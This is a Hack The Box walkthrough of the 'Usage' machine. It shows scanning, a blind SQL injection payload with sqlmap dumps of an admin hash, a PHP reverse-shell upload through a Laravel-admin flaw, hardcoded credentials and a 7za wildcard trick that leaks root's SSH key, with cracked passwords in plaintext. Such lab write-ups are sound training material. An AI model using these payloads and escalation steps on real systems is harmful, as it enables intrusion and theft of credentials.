---
icon: ubuntu
---

# Usage - Easyn

<figure><img src="../../.gitbook/assets/image (3223).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/usage"><strong>Usage</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.5.66 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-26 11:06 -0500
Nmap scan report for 10.129.5.66
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   85.60 ms 10.10.16.1
2   23.77 ms 10.129.5.66
```
{% endcode %}

Nmap scan reveals a domain name I will add it to my hosts file

{% code title="/etc/hosts" %}
```shellscript
10.129.5.66	usage.htb
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (3224).png" alt=""><figcaption></figcaption></figure>

Clicking on admin we get a redirect&#x20;

<figure><img src="../../.gitbook/assets/image (3225).png" alt=""><figcaption></figcaption></figure>

I'll update my hosts file with the subdomain

#### <mark style="color:$primary;">admin.usage.htb</mark>

<figure><img src="../../.gitbook/assets/image (3226).png" alt=""><figcaption></figcaption></figure>

Default credentials do not work here. I am going to register an account on usage.htb and see what I can find

#### <mark style="color:$primary;">usage.htb</mark>

After registering and account and logging in, we get a long welcoming message.

<figure><img src="../../.gitbook/assets/image (3227).png" alt=""><figcaption></figcaption></figure>

There is really nothing of interest here, I am going to test for SQLI

#### <mark style="color:$primary;">usage.htb/forget-password</mark>

<figure><img src="../../.gitbook/assets/image (3228).png" alt=""><figcaption></figcaption></figure>

Sending a single quote via the email address field we get 500 server error! That’s a good indication of SQLI

<figure><img src="../../.gitbook/assets/image (3229).png" alt=""><figcaption></figcaption></figure>

My guess is it was looking up the email address in the Database like this:

```sql
select * from users where email = '{my input}';
```

this should work then `' or 1=1 limit 1;-- -`

<figure><img src="../../.gitbook/assets/image (3230).png" alt=""><figcaption></figcaption></figure>

And it does! SQLI confirmed, this is a blind SQLI no data is being displayed back to us.

### <mark style="color:$primary;">Blind SQLI in email reset form field</mark>

For this case I am going to use sqlmap.

* First Capture the request in burpsuite and save it to a file&#x20;

<figure><img src="../../.gitbook/assets/image (3235).png" alt=""><figcaption></figcaption></figure>

At first running sqlmap as below nothing comes up

```shellscript
sqlmap -r password_reset.req -p email --batch
```

<figure><img src="../../.gitbook/assets/image (3233).png" alt=""><figcaption></figcaption></figure>

But I know this is injectable so I increased the level, risk and told it to focus on the email paramater

```shellscript
└─$ sqlmap -r password-reset.req --level 5 --risk 3 -p email --batch
...[snip]...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=CN00UfKcZvstUmWxp4xyFyOSdQFZcH3esQ4nAtpN&email=test@test.com' AND 2731=(SELECT (CASE WHEN (2731=2731) THEN 2731 ELSE (SELECT 7683 UNION SELECT 9734) END))-- bddb

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=CN00UfKcZvstUmWxp4xyFyOSdQFZcH3esQ4nAtpN&email=test@test.com' AND 4168=BENCHMARK(5000000,MD5(0x48776559))-- Pjim
---
[13:17:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL < 5.0.12
...[snip]...
```

<mark style="color:yellow;">**DB Enumeration**</mark>

```shellscript
└─$ sqlmap -r password-reset.request --level 5 --risk 3 -p email --batch --dbs
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
...[snip]...
```

`usage_blog` is the non default db&#x20;

{% code overflow="wrap" %}
```shellscript
└─$ sqlmap -r password-reset.request --level 5 --risk 3 -p email --batch -D usage_blog --tables
...[snip]...
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```
{% endcode %}

I'll check the `admin_users table`

```shellscript
└─$ sqlmap -r password-reset.request --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users --dump
...[snip]...
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
...[snip]...
```

#### <mark style="color:$primary;">Crack administrator hash</mark>

Save the discovered hash to a file then run

{% code overflow="wrap" %}
```shellscript
john administrator_hash -w=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3193).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">admin.usage.htb</mark>

this credentials work on the admin page <mark style="color:$success;">**admin:whatever1**</mark>

<figure><img src="../../.gitbook/assets/image (3195).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3196).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page is a version for laravel admin

<figure><img src="../../.gitbook/assets/image (3197).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Exploitation</mark>

### <mark style="color:blue;">Laravel Administrator Unrestricted File Upload</mark>&#x20;

<mark style="color:$primary;">**CVE-2023-24249**</mark>

<figure><img src="../../.gitbook/assets/image (3198).png" alt=""><figcaption></figcaption></figure>

There is an exploit available for this on exploit DB, I took a look at it and we can do it manually

<mark style="color:yellow;">**To get a shell:**</mark>

* Create a reverse php shell using -> [https://www.revshells.com/](https://www.revshells.com/)

<figure><img src="../../.gitbook/assets/image (3204).png" alt=""><figcaption></figcaption></figure>

* to this `$shell = 'uname -a; w; id; /bin/bash -i';`
* Save it to a file -> rev.php.jpg
* start a listener on desired port&#x20;

{% code overflow="wrap" %}
```shellscript
rlwrap nc -nvlp 443
```
{% endcode %}

* Prepare Burp Suite to Intercept the request
* go to Administrator -> Settings -> upload our php reverse shell&#x20;

<figure><img src="../../.gitbook/assets/image (3200).png" alt=""><figcaption></figcaption></figure>

* After intercepting the request modify the filename value from <mark style="color:$warning;">**rev.php.jpg -> rev.php**</mark>

<figure><img src="../../.gitbook/assets/image (3202).png" alt=""><figcaption></figcaption></figure>

* Now forward the request
* To get a reverse shell access the file's location

<figure><img src="../../.gitbook/assets/image (3205).png" alt=""><figcaption></figcaption></figure>

[http://admin.usage.htb/uploads/images/rev.php](http://admin.usage.htb/uploads/images/rev.php)

<figure><img src="../../.gitbook/assets/image (3206).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as dash</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3208).png" alt=""><figcaption></figcaption></figure>

Besides root and dash there is another user on this machine! There might be some creds somewhere

<figure><img src="../../.gitbook/assets/image (3207).png" alt=""><figcaption></figcaption></figure>

I found 4 files related to [**Monit**](https://mmonit.com/monit/) in dash home directory

* _<mark style="color:yellow;">**Monit is a small Open Source utility for managing and monitoring Unix systems. Monit conducts automatic maintenance and repair and can execute meaningful causal actions in error situations.**</mark>_

### <mark style="color:blue;">Hardcoded Credentials</mark>

<figure><img src="../../.gitbook/assets/image (3209).png" alt=""><figcaption></figcaption></figure>

We come across some Hardcoded credentials in the config file for monit!

<figure><img src="../../.gitbook/assets/image (3211).png" alt=""><figcaption></figcaption></figure>

These credentials work for xander

{% code overflow="wrap" %}
```shellscript
xander:3nc0d3d_pa$$w0rd
```
{% endcode %}

### <mark style="color:blue;">Shell as xander</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3213).png" alt=""><figcaption></figcaption></figure>

xander can run usage\_management binary as root

<mark style="color:yellow;">**VirusTotal Check**</mark>

<figure><img src="../../.gitbook/assets/image (3214).png" alt=""><figcaption></figcaption></figure>

This file has never been submitted to Virus Total before

<figure><img src="../../.gitbook/assets/image (3215).png" alt=""><figcaption></figcaption></figure>

This means this is a custom applicaiton made for this system.

### <mark style="color:blue;">/usr/bin/usage\_management</mark>

Running the binary offers a menu with three options:

{% code overflow="wrap" %}
```shellscript
xander@usage:~$ sudo usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```
{% endcode %}

Option 1 runs 7-Zip:

{% code overflow="wrap" %}
```shellscript
xander@usage:~$ sudo usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17946 files, 113878828 bytes (109 MiB)              

Creating archive: /var/backups/project.zip

Items to compress: 20930

                                                                               
Files read from disk: 17946                                                                                                             
Archive size: 54829927 bytes (53 MiB)                                                                                                   
Everything is Ok 
```
{% endcode %}

Option 2 just returns

<figure><img src="../../.gitbook/assets/image (3216).png" alt=""><figcaption></figcaption></figure>

Option three just returns a message:

<figure><img src="../../.gitbook/assets/image (3217).png" alt=""><figcaption></figcaption></figure>

I'll run strings on the binary and see what it uncovers

{% code overflow="wrap" %}
```shellscript
strings /usr/bin/usage_management
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3218).png" alt=""><figcaption></figcaption></figure>

Changes directory to /var/www/html

We can see the command being run by option 1 here

{% code overflow="wrap" %}
```shellscript
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```
{% endcode %}

### <mark style="color:blue;">7za Wildcard Spare trick</mark>

{% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z" %}

Hack tricks has a detailed attack plan for 7za wildcards

<mark style="color:yellow;">**The attack is to create a file named**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`@whatever`**</mark><mark style="color:yellow;">**, and then another one named**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`whatever`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**that is a symbolic link to the file I want to read.**</mark>

When 7z processes the wildcard, it will look like:

{% code overflow="wrap" %}
```shellscript
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @whatever whatever [otherfiles]
```
{% endcode %}

<mark style="color:yellow;">**7z will process**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`@whatever`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**as a marker to read the contents of**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`whatever`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**as a list of files to include. When the content of that file isn’t a list of file names, it will print the contents as errors.**</mark>

{% code overflow="wrap" %}
```shellscript
cd /var/www/html
touch @deimos
ln -fs /root/.ssh/id_rsa deimos
sudo usage_management
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3219).png" alt=""><figcaption></figcaption></figure>

Remove the warnings, save root's private key to a file. And then we can ssh

<figure><img src="../../.gitbook/assets/image (3220).png" alt=""><figcaption></figcaption></figure>

To fix the key i will use vi

{% code overflow="wrap" %}
```shellscript
vi -c ':%s/\s*:.*$//g | x' root_id_rsa
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3221).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
chmod 600 root_id_rsa
```
{% endcode %}

Now we can ssh

<figure><img src="../../.gitbook/assets/image (3222).png" alt=""><figcaption></figcaption></figure>
